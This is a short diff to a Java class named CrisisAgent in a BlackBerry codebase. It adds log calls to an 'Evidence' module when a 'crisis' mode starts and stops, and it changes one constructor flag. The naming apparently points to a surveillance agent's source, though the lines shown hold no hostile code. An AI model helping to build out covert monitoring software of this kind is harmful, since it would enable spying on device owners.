@@ -15,8 +15,8 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class CrisisAgent.
  */
@@ -42,7 +42,7 @@ public final class CrisisAgent extends Agent {
      *            the agent status
      */
     public CrisisAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_CRISIS, agentEnabled, true, "CrisisAgent");
+        super(Agent.AGENT_CRISIS, agentEnabled, false, "CrisisAgent");
     }
 
     /**
@@ -68,10 +68,12 @@ public final class CrisisAgent extends Agent {
 
     public void actualStart() {
         Status.getInstance().startCrisis();
+        Evidence.info("Crisis started");
     }
 
     public void actualStop() {
         Status.getInstance().stopCrisis();
+        Evidence.info("Crisis stopped");
     }
 
     /*
